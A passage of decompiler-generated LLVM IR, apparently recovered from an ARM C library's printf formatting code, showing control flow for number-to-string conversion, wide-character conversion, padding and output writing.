bb140:                                            ; preds = %dec_label_pc_10438
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_10450

dec_label_pc_10444:                               ; preds = %dec_label_pc_10438
  br i1 %v7_10464, label %dec_label_pc_10454, label %dec_label_pc_10450

dec_label_pc_10450:                               ; preds = %.thread84, %bb140, %dec_label_pc_10444
  %v0_1047c86 = phi i32 [ %v5_10430, %.thread84 ], [ %v4_10404, %bb140 ], [ %v4_10404, %dec_label_pc_10444 ]
  br label %dec_label_pc_10454

dec_label_pc_10454:                               ; preds = %dec_label_pc_10444, %dec_label_pc_10450
  %v0_1047c85 = phi i32 [ %v0_1047c86, %dec_label_pc_10450 ], [ %v4_10404, %dec_label_pc_10444 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_10450 ], [ 6, %dec_label_pc_10444 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_10454 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10454, i32* %r3.global-to-local, align 4
  %v1_10458 = icmp slt i32 %v3_10454, 0
  %v7_1045c. = select i1 %v1_10458, i32 %v7_1045c, i32 32
  store i32 %v7_1045c., i32* @sb, align 4
  br i1 %v7_10464, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_10454
  store i32 %v2_103b0, i32* @lr, align 4
  %v2_1046c = load i32, i32* %ip.global-to-local, align 4
  %v5_1046c = mul i32 %v2_1046c, 4
  %v6_1046c = add i32 %v5_1046c, %v2_103b0
  store i32 %v6_1046c, i32* %r3.global-to-local, align 4
  %v2_10470 = add i32 %v6_1046c, -260
  %v3_10470 = inttoptr i32 %v2_10470 to i32*
  %v4_10470 = load i32, i32* %v3_10470, align 4
  store i32 %v4_10470, i32* %r3.global-to-local, align 4
  %v2_10478 = and i32 %v4_10470, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_10454, %.thread16
  %storemerge94 = phi i32 [ %v2_10478, %.thread16 ], [ 1024, %dec_label_pc_10454 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_1047c85, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_10484 = call i32 @_load_inttype()
  %v0_10488 = load i32, i32* @r1, align 4
  store i32 %v0_10488, i32* %r2.global-to-local, align 4
  %v0_10494 = load i32, i32* @r4, align 4
  store i32 %v0_10494, i32* %r3.global-to-local, align 4
  store i32 %v2_10498, i32* %r0.global-to-local, align 4
  %v0_1049c = load i32, i32* @r5, align 4
  %v6_104a0 = call i32 @_uintmaxtostr(i8* %v5_104a0, i32 %v0_10484, i32 %v0_10488, i32 %v0_10494, i32 %v0_1049c)
  store i32 %v6_104a0, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_104a0, i32* @r6, align 4
  br i1 %v3_104b0, label %bb148, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %bb145
  %v7_104a0 = inttoptr i32 %v6_104a0 to i8*
  %v3_104b4 = load i8, i8* %v7_104a0, align 1
  %v7_104b8 = icmp eq i8 %v3_104b4, 45
  %v2_104c0 = or i32 %v0_10424, 2
  %v2_104c0.stack_var_-316.4 = select i1 %v7_104b8, i32 %v2_104c0, i32 %v0_10424
  store i32 %v2_104c0.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_104b8, label %.thread18, label %dec_label_pc_104d4

.thread18:                                        ; preds = %dec_label_pc_104b4
  %v3_104c4 = add i32 %v6_104a0, 1
  store i32 %v3_104c4, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_104d4:                               ; preds = %dec_label_pc_104b4
  %v1_104d4 = and i32 %v2_104c0.stack_var_-316.4, 2
  %v2_104d4 = icmp eq i32 %v1_104d4, 0
  br i1 %v2_104d4, label %dec_label_pc_104e0, label %bb146

bb146:                                            ; preds = %dec_label_pc_104d4
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_104e0:                               ; preds = %dec_label_pc_104d4
  %v1_104e0 = urem i32 %v2_104c0.stack_var_-316.4, 2
  %v2_104e0 = icmp eq i32 %v1_104e0, 0
  br i1 %v2_104e0, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_104e0
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_104e0, %bb147
  %v0_1053c = phi i32 [ %v6_104a0, %bb145 ], [ %v3_104c4, %.thread18 ], [ %v6_104a0, %dec_label_pc_104e0 ], [ %v6_104a0, %bb147 ], [ %v6_104a0, %bb146 ]
  %v0_104f8 = phi i32 [ %v0_10424, %bb145 ], [ %v2_104c0, %.thread18 ], [ %v0_10424, %dec_label_pc_104e0 ], [ %v0_10424, %bb147 ], [ %v0_10424, %bb146 ]
  %v3_104e8 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_104e8, i32* %r2.global-to-local, align 4
  store i32 %v0_104f8, i32* %r3.global-to-local, align 4
  %v1_104f0 = icmp slt i32 %v3_104e8, 0
  br i1 %v1_104f0, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_10520 = phi i32 [ %v3_104e8, %bb148 ], [ 1, %bb149 ]
  %v1_104f8 = and i32 %v0_104f8, 16
  %v2_104f8 = icmp eq i32 %v1_104f8, 0
  store i32 %v2_106cc, i32* %r3.global-to-local, align 4
  %v2_10500 = sub i32 %v2_106cc, %v0_1053c
  %v1_10504 = add i32 %v2_10500, 127
  store i32 %v1_10504, i32* @r5, align 4
  br i1 %v2_104f8, label %bb157, label %dec_label_pc_1050c

dec_label_pc_1050c:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_1050c
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_1050c, %bb151
  br i1 %v7_10518, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_10520, %v1_10504
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_10524, label %dec_label_pc_1052c, label %bb157

dec_label_pc_1052c:                               ; preds = %bb155
  %v1_1052c = inttoptr i32 %v0_1053c to i8*
  %v2_1052c = load i8, i8* %v1_1052c, align 1
  %v3_1052c = zext i8 %v2_1052c to i32
  store i32 %v3_1052c, i32* %r3.global-to-local, align 4
  %v7_10530 = icmp eq i8 %v2_1052c, 48
  br i1 %v7_10530, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_1052c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_1052c
  %v2_10538 = add i32 %v2_10500, 128
  store i32 %v2_10538, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_10574 = phi i32 [ %v0_10520, %bb155 ], [ %v0_10520, %bb150 ], [ 1, %bb156 ], [ %v2_10538, %.thread25 ], [ %v0_10520, %bb154 ]
  %v1_1053c = inttoptr i32 %v0_1053c to i8*
  %v2_1053c = load i8, i8* %v1_1053c, align 1
  %v3_1053c = zext i8 %v2_1053c to i32
  store i32 %v3_1053c, i32* %r3.global-to-local, align 4
  %v7_10540 = icmp eq i8 %v2_1053c, 48
  br i1 %v7_10540, label %dec_label_pc_10548, label %dec_label_pc_10570

dec_label_pc_10548:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_1054c = load i32, i32* @r7, align 4
  %v7_10550 = icmp slt i32 %v0_1054c, 6
  br i1 %v7_10550, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_10548
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_10548, %bb158
  br i1 %v7_10464, label %.thread26, label %dec_label_pc_10564

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_19f10.348 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_106e4

dec_label_pc_10564:                               ; preds = %bb159
  %v2_10564 = icmp eq i32 %v5_10574, 0
  br i1 %v2_10564, label %bb160, label %dec_label_pc_10570

bb160:                                            ; preds = %dec_label_pc_10564
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_106e4

dec_label_pc_10570:                               ; preds = %dec_label_pc_10564, %bb157
  %v2_10570 = sub i32 %v5_10574, %v1_10504
  %tmp199 = icmp ugt i32 %v5_10574, %v1_10504
  br i1 %tmp199, label %.thread90, label %dec_label_pc_106e4

.thread90:                                        ; preds = %dec_label_pc_10570
  store i32 %v2_10570, i32* @r4, align 4
  br label %dec_label_pc_10700thread-pre-split

dec_label_pc_10580:                               ; preds = %dec_label_pc_103f4
  br i1 %tmp196, label %dec_label_pc_105bc, label %dec_label_pc_10588

dec_label_pc_10588:                               ; preds = %dec_label_pc_10580
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_10594 = load i32, i32* @fp, align 4
  store i32 %v0_10594, i32* %r0.global-to-local, align 4
  %v2_10598 = load i32, i32* %v1_103dc, align 4
  %v5_10598 = load i32, i32* %v4_10598, align 4
  store i32 %v5_10598, i32* %r2.global-to-local, align 4
  store i32 %v2_1059c, i32* %r3.global-to-local, align 4
  %v5_105a0 = sext i32 %v2_10598 to i64
  %v6_105a0 = bitcast i64 %v5_105a0 to double
  %v7_105a0 = call i32 @_fpmaxtostr(i32 %v0_10594, double %v6_105a0, i32 %v5_10598, i32 %v2_1059c, i32 66048)
  store i32 %v7_105a0, i32* %r0.global-to-local, align 4
  %v1_105a4 = icmp slt i32 %v7_105a0, 0
  br i1 %v1_105a4, label %dec_label_pc_10850, label %dec_label_pc_105ac

dec_label_pc_105ac:                               ; preds = %dec_label_pc_10588
  %v2_105b0 = add i32 %v7_105a0, %stack_var_-336.2
  store i32 %v2_105b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1083c

dec_label_pc_105bc:                               ; preds = %dec_label_pc_10580
  br i1 %v3_105c0, label %dec_label_pc_1065c, label %dec_label_pc_105c4

dec_label_pc_105c4:                               ; preds = %dec_label_pc_105bc
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_105bc, label %dec_label_pc_105d4, label %dec_label_pc_10624

dec_label_pc_105d4:                               ; preds = %dec_label_pc_105c4
  %v2_105d4 = load i32, i32* %v1_103dc, align 4
  store i32 %v2_105d4, i32* %r3.global-to-local, align 4
  %v9_105d8 = icmp eq i32 %v2_105d4, 0
  store i32 %v2_105d4, i32* %stack_var_-44, align 4
  br i1 %v9_105d8, label %dec_label_pc_106ec, label %dec_label_pc_105e4

dec_label_pc_105e4:                               ; preds = %dec_label_pc_105d4
  %v3_105e4 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_105e4, i32* %r3.global-to-local, align 4
  store i32 %v2_105e8, i32* @r0, align 4
  %v5_105f4 = icmp slt i32 %v3_105e4, -1
  br i1 %v5_105f4, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_105e4
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_105e4, %bb161
  %storemerge193 = phi i32 [ %v3_105e4, %bb161 ], [ -1, %dec_label_pc_105e4 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_105e8, i32* @r1, align 4
  store i32 %v2_105fc, i32* %r3.global-to-local, align 4
  %v0_10600 = call i32 @__GI_wcsrtombs()
  store i32 %v0_10600, i32* %r0.global-to-local, align 4
  %v7_10604 = icmp eq i32 %v0_10600, -1
  store i32 %v0_10600, i32* @r5, align 4
  br i1 %v7_10604, label %dec_label_pc_10850, label %dec_label_pc_10610

dec_label_pc_10610:                               ; preds = %bb162
  %v0_10610 = load i32, i32* @sl, align 4
  store i32 %v0_10610, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_10610, i32* @r6, align 4
  br label %dec_label_pc_10700

dec_label_pc_10624:                               ; preds = %dec_label_pc_105c4
  store i32 %v2_106cc, i32* %r8.global-to-local, align 4
  %v2_10628 = load i32, i32* %v1_103dc, align 4
  store i32 %v2_105fc, i32* %r2.global-to-local, align 4
  store i32 %v2_106cc, i32* %r0.global-to-local, align 4
  %v3_10634 = call i32 @__GI_wcrtomb(i32 %v2_106cc, i32 %v2_10628, i32 %v2_105fc)
  store i32 %v3_10634, i32* %r0.global-to-local, align 4
  %v7_10638 = icmp eq i32 %v3_10634, -1
  store i32 %v3_10634, i32* @r5, align 4
  br i1 %v7_10638, label %dec_label_pc_10850, label %dec_label_pc_10644

dec_label_pc_10644:                               ; preds = %dec_label_pc_10624
  %v0_10644 = load i32, i32* @sl, align 4
  store i32 %v0_10644, i32* @r4, align 4
  store i32 %v2_106cc, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_10654 = trunc i32 %v0_10644 to i8
  %v2_10654 = load i32, i32* %r8.global-to-local, align 4
  %v4_10654 = add i32 %v2_10654, %v3_10634
  %v5_10654 = inttoptr i32 %v4_10654 to i8*
  store i8 %v1_10654, i8* %v5_10654, align 1
  %v0_10704.pre.pre = load i32, i32* @r5, align 4
  %v1_10704.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10700thread-pre-split

dec_label_pc_1065c:                               ; preds = %dec_label_pc_105bc
  br i1 %v3_10660, label %dec_label_pc_106c0, label %dec_label_pc_10664

dec_label_pc_10664:                               ; preds = %dec_label_pc_1065c
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_1066c = load i32, i32* %v1_103dc, align 4
  br i1 %v7_1065c, label %dec_label_pc_1066c, label %dec_label_pc_10698

dec_label_pc_1066c:                               ; preds = %dec_label_pc_10664
  store i32 %v2_1066c, i32* @r6, align 4
  %v2_10670 = icmp eq i32 %v2_1066c, 0
  br i1 %v2_10670, label %dec_label_pc_106ec, label %dec_label_pc_10678

dec_label_pc_10678:                               ; preds = %dec_label_pc_1066c, %dec_label_pc_106c8
  %v0_10688 = phi i32 [ %v2_1066c, %dec_label_pc_1066c ], [ %v3_106d8, %dec_label_pc_106c8 ]
  %v3_10678 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10678, i32* %r3.global-to-local, align 4
  %v5_10684 = icmp slt i32 %v3_10678, -1
  br i1 %v5_10684, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_10678
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_10678, %bb163
  %storemerge194 = phi i32 [ %v3_10678, %bb163 ], [ -1, %dec_label_pc_10678 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_10688, i32* %r0.global-to-local, align 4
  %v1_1068c = inttoptr i32 %v0_10688 to i8*
  %v2_1068c = call i32 @strnlen(i8* %v1_1068c)
  store i32 %v2_1068c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_106f4

dec_label_pc_10698:                               ; preds = %dec_label_pc_10664
  store i32 %v2_1066c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_106cc, i32* @r6, align 4
  store i32 %v2_1066c, i32* %stack_var_-180, align 4
  br label %dec_label_pc_10700thread-pre-split

dec_label_pc_106c0:                               ; preds = %dec_label_pc_1065c
  br i1 %v7_106c0, label %dec_label_pc_106c8, label %dec_label_pc_10850

dec_label_pc_106c8:                               ; preds = %dec_label_pc_106c0
  %v0_106c8 = call i32 @__errno_location()
  store i32 %v0_106c8, i32* %r0.global-to-local, align 4
  %v1_106d0 = inttoptr i32 %v0_106c8 to i32*
  %v2_106d0 = load i32, i32* %v1_106d0, align 4
  store i32 %v2_106d0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_106d8 = call i32 @__GI___glibc_strerror_r(i32 %v2_106d0, i32 %v2_106cc, i32 128)
  store i32 %v3_106d8, i32* %r0.global-to-local, align 4
  store i32 %v3_106d8, i32* @r6, align 4
  br label %dec_label_pc_10678

dec_label_pc_106e4:                               ; preds = %dec_label_pc_10570, %.thread26, %bb160
  %v0_10704.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_10504, %dec_label_pc_10570 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10700thread-pre-split

dec_label_pc_106ec:                               ; preds = %dec_label_pc_1066c, %dec_label_pc_105d4
  store i32 ptrtoint ([7 x i8]* @global_var_19f18.351 to i32), i32* @r6, align 4
  br label %dec_label_pc_106f4

dec_label_pc_106f4:                               ; preds = %bb164, %dec_label_pc_106ec
  %storemerge = phi i32 [ 6, %dec_label_pc_106ec ], [ %v2_1068c, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_10700

dec_label_pc_10700thread-pre-split:               ; preds = %.thread90, %dec_label_pc_10644, %dec_label_pc_10698, %dec_label_pc_106e4
  %v1_10704.pre = phi i32 [ 0, %dec_label_pc_106e4 ], [ %v1_10704.pre.pre, %dec_label_pc_10644 ], [ 0, %dec_label_pc_10698 ], [ %v2_10570, %.thread90 ]
  %v0_10704.pre = phi i32 [ %v0_10704.pre81, %dec_label_pc_106e4 ], [ %v0_10704.pre.pre, %dec_label_pc_10644 ], [ 1, %dec_label_pc_10698 ], [ %v1_10504, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_104f8, %dec_label_pc_106e4 ], [ %v0_10424, %dec_label_pc_10644 ], [ %v0_10424, %dec_label_pc_10698 ], [ %v0_104f8, %.thread90 ]
  %v0_10700.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_10700

dec_label_pc_10700:                               ; preds = %dec_label_pc_10700thread-pre-split, %dec_label_pc_10610, %dec_label_pc_106f4
  %v1_10740 = phi i32 [ %v1_10704.pre, %dec_label_pc_10700thread-pre-split ], [ %v0_10610, %dec_label_pc_10610 ], [ 0, %dec_label_pc_106f4 ]
  %v0_10704 = phi i32 [ %v0_10704.pre, %dec_label_pc_10700thread-pre-split ], [ %v0_10600, %dec_label_pc_10610 ], [ %storemerge, %dec_label_pc_106f4 ]
  %v0_1070c = phi i32 [ %v0_10700.pr, %dec_label_pc_10700thread-pre-split ], [ 11, %dec_label_pc_10610 ], [ 11, %dec_label_pc_106f4 ]
  %v0_10748 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_10700thread-pre-split ], [ %v0_10424, %dec_label_pc_10610 ], [ %v0_10424, %dec_label_pc_106f4 ]
  %v7_10700 = icmp eq i32 %v0_1070c, 11
  %v2_10704 = add i32 %v0_10704, %v1_10740
  br i1 %v7_10700, label %dec_label_pc_1071c, label %bb165

bb165:                                            ; preds = %dec_label_pc_10700
  %v7_10714 = icmp sgt i32 %v0_1070c, 5
  %. = select i1 %v7_10714, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_10718 = add i32 %., %v2_10704
  br label %dec_label_pc_1071c

dec_label_pc_1071c:                               ; preds = %dec_label_pc_10700, %bb165
  %v0_10730 = phi i32 [ %v2_10704, %dec_label_pc_10700 ], [ %v2_10718, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_10720 = sub i32 %tmp97, %v0_10730
  %v3_10720 = icmp uge i32 %tmp97, %v0_10730
  %v9_10720 = icmp eq i32 %tmp97, %v0_10730
  %v2_10724 = xor i1 %v3_10720, true
  %v3_10724 = or i1 %v9_10720, %v2_10724
  br i1 %v3_10724, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_1071c
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_1071c, %bb166
  %v2_10728 = xor i1 %v9_10720, true
  %v3_10728 = and i1 %v3_10720, %v2_10728
  br i1 %v3_10728, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_10730.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_10720, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_10740 = phi i32 [ %v1_10730.pre, %._crit_edge ], [ %v2_10720, %bb168 ]
  %v2_10730 = add i32 %v0_10730, %stack_var_-336.2
  %v2_10734 = add i32 %v2_10730, %v2_10740
  store i32 %v2_10734, i32* %ip.global-to-local, align 4
  store i32 %v0_10748, i32* %r3.global-to-local, align 4
  %v0_1073c = load i32, i32* @sb, align 4
  %v7_1073c = icmp eq i32 %v0_1073c, 48
  br i1 %v7_1073c, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_10740 = add i32 %v2_10740, %v1_10740
  store i32 %v3_10740, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_1075c = phi i32 [ %v2_10740, %bb169 ], [ 0, %bb170 ]
  %v1_10748 = and i32 %v0_10748, 8
  store i32 %v1_10748, i32* @r8, align 4
  %v2_10748 = icmp eq i32 %v1_10748, 0
  br i1 %v2_10748, label %dec_label_pc_10754, label %dec_label_pc_10770

dec_label_pc_10754:                               ; preds = %.thread29
  %v0_10754 = load i32, i32* @fp, align 4
  store i32 %v0_10754, i32* %r0.global-to-local, align 4
  store i32 %v0_1075c, i32* %r2.global-to-local, align 4
  %v4_10760 = call i32 @_charpad(i32 %v0_10754, i8 32, i32 %v0_1075c)
  store i32 %v4_10760, i32* %r0.global-to-local, align 4
  %v1_10764 = load i32, i32* @sl, align 4
  %v9_10764 = icmp eq i32 %v4_10760, %v1_10764
  br i1 %v9_10764, label %dec_label_pc_1076c, label %dec_label_pc_10850

dec_label_pc_1076c:                               ; preds = %dec_label_pc_10754
  %v0_1076c = load i32, i32* @r8, align 4
  store i32 %v0_1076c, i32* @sl, align 4
  %v0_10778.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10770

dec_label_pc_10770:                               ; preds = %.thread29, %dec_label_pc_1076c
  %v0_10778 = phi i32 [ %v0_1070c, %.thread29 ], [ %v0_10778.pre, %dec_label_pc_1076c ]
  %v0_10774 = load i32, i32* @fp, align 4
  %v2_10778 = add i32 %v0_10778, ptrtoint (i32* @global_var_19f20.353 to i32)
  store i32 %v2_10778, i32* %r0.global-to-local, align 4
  %v2_1077c = inttoptr i32 %v2_10778 to i8*
  %v3_1077c = call i32 @__GI_fputs_unlocked(i8* %v2_1077c, i32 %v0_10774)
  %v0_10780 = load i32, i32* @fp, align 4
  store i32 %v0_10780, i32* %r0.global-to-local, align 4
  %v0_10788 = load i32, i32* @r4, align 4
  store i32 %v0_10788, i32* %r2.global-to-local, align 4
  %v4_1078c = call i32 @_charpad(i32 %v0_10780, i8 48, i32 %v0_10788)
  store i32 %v4_1078c, i32* %r0.global-to-local, align 4
  %v1_10790 = load i32, i32* @r4, align 4
  %v9_10790 = icmp eq i32 %v4_1078c, %v1_10790
  br i1 %v9_10790, label %dec_label_pc_10798, label %dec_label_pc_10850

dec_label_pc_10798:                               ; preds = %dec_label_pc_10770
  %v3_10798 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_10798, i32* %r3.global-to-local, align 4
  %v2_1079c = icmp eq i32 %v3_10798, 0
  br i1 %v2_1079c, label %dec_label_pc_107ac, label %dec_label_pc_1080cthread-pre-split

dec_label_pc_107ac:                               ; preds = %dec_label_pc_10798
  %v0_107ac = load i32, i32* @r5, align 4
  %v2_107ac = icmp eq i32 %v0_107ac, 0
  br i1 %v2_107ac, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_107ac
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_107ac
  %v1_107b4 = load i32, i32* @r6, align 4
  store i32 %v1_107b4, i32* %r0.global-to-local, align 4
  %v1_107bc = load i32, i32* @fp, align 4
  store i32 %v1_107bc, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 67524, i32* @lr, align 4
  %v1_107c0 = xor i1 %v2_107ac, true
  call void @__pseudo_cond_branch(i1 %v1_107c0, i32 ptrtoint (i32* @global_var_13e54.344 to i32))
  %v0_107c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_107c4 = load i32, i32* @r5, align 4
  %v9_107c4 = icmp eq i32 %v0_107c4, %v1_107c4
  br i1 %v9_107c4, label %dec_label_pc_10824, label %dec_label_pc_10850

dec_label_pc_107d0:                               ; preds = %dec_label_pc_1080c
  %v2_107d0 = icmp ult i32 %v1_107d4, 128
  %.v1_107d4 = select i1 %v2_107d0, i32 %v1_107d4, i32 128
  store i32 %.v1_107d4, i32* @r2, align 4
  %v0_107dc = call i32 @__GI_wcsrtombs()
  store i32 %v0_107dc, i32* @r4, align 4
  %v2_107e0 = icmp eq i32 %v0_107dc, 0
  store i32 %v0_107dc, i32* %r3.global-to-local, align 4
  store i32 %v2_106cc, i32* %r0.global-to-local, align 4
  %v0_107f0 = load i32, i32* @fp, align 4
  store i32 %v0_107f0, i32* %r2.global-to-local, align 4
  br i1 %v2_107e0, label %dec_label_pc_10800, label %dec_label_pc_107f8

dec_label_pc_107f8:                               ; preds = %dec_label_pc_107d0
  %v3_107f8 = call i32 @__stdio_fwrite(i32 %v2_106cc, i32 %v0_107dc, i32 %v0_107f0)
  store i32 %v3_107f8, i32* %r0.global-to-local, align 4
  store i32 %v3_107f8, i32* %r3.global-to-local, align 4
  %v1_10800.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10800

dec_label_pc_10800:                               ; preds = %dec_label_pc_107d0, %dec_label_pc_107f8
  %v1_10800 = phi i32 [ 0, %dec_label_pc_107d0 ], [ %v1_10800.pre, %dec_label_pc_107f8 ]
  %v0_10804 = phi i32 [ 0, %dec_label_pc_107d0 ], [ %v3_107f8, %dec_label_pc_107f8 ]
  %v9_10800 = icmp eq i32 %v0_10804, %v1_10800
  %v1_10804 = load i32, i32* @r5, align 4
  %v2_10804 = sub i32 %v1_10804, %v0_10804
  store i32 %v2_10804, i32* @r5, align 4
  br i1 %v9_10800, label %dec_label_pc_1080c, label %dec_label_pc_10850

dec_label_pc_1080cthread-pre-split:               ; preds = %dec_label_pc_10798
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_10810.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %dec_label_pc_1080cthread-pre-split, %dec_label_pc_10800
  %v1_107d4 = phi i32 [ %v0_10810.pr, %dec_label_pc_1080cthread-pre-split ], [ %v2_10804, %dec_label_pc_10800 ]
  store i32 %v2_106cc, i32* @r6, align 4
  %v2_10810 = icmp eq i32 %v1_107d4, 0
  store i32 %v2_105e8, i32* @r1, align 4
  store i32 %v2_105fc, i32* %r3.global-to-local, align 4
  store i32 %v2_106cc, i32* @r0, align 4
  br i1 %v2_10810, label %dec_label_pc_10824, label %dec_label_pc_107d0

dec_label_pc_10824:                               ; preds = %dec_label_pc_1080c, %.thread36
  %v0_10824 = load i32, i32* @fp, align 4
  store i32 %v0_10824, i32* %r0.global-to-local, align 4
  %v0_1082c = load i32, i32* @sl, align 4
  store i32 %v0_1082c, i32* %r2.global-to-local, align 4
  %v4_10830 = call i32 @_charpad(i32 %v0_10824, i8 32, i32 %v0_1082c)
  store i32 %v4_10830, i32* %r0.global-to-local, align 4
  %v1_10834 = load i32, i32* @sl, align 4
  %v9_10834 = icmp eq i32 %v4_10830, %v1_10834
  br i1 %v9_10834, label %dec_label_pc_1083c, label %dec_label_pc_10850

dec_label_pc_1083c:                               ; preds = %dec_label_pc_10824, %dec_label_pc_105ac, %dec_label_pc_103d0
  %stack_var_-316.3 = phi i32 [ %v0_10424, %dec_label_pc_103d0 ], [ %v0_10748, %dec_label_pc_10824 ], [ %v0_10424, %dec_label_pc_105ac ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_103d0 ], [ %v2_10734, %dec_label_pc_10824 ], [ %v2_105b0, %dec_label_pc_105ac ]
  %v3_1083c = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_1083c, i32* @r4, align 4
  br label %dec_label_pc_10840

dec_label_pc_10840:                               ; preds = %dec_label_pc_102e0, %dec_label_pc_1083c
  %v0_10840 = phi i32 [ %v0_10840.pre, %dec_label_pc_102e0 ], [ %v3_1083c, %dec_label_pc_1083c ]
  %v0_10424 = phi i32 [ %tmp100, %dec_label_pc_102e0 ], [ %stack_var_-316.3, %dec_label_pc_1083c ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_102e0 ], [ %stack_var_-336.3, %dec_label_pc_1083c ]
  store i32 %v0_10840, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_102f8.outer

dec_label_pc_102f8.outer:                         ; preds = %dec_label_pc_10848, %dec_label_pc_10840
  %v5_10324 = phi i32 [ %v1_10354, %dec_label_pc_10848 ], [ %v0_10840, %dec_label_pc_10840 ]
  %v0_102f849 = phi i32 [ %v1_10848, %dec_label_pc_10848 ], [ %v0_10840, %dec_label_pc_10840 ]
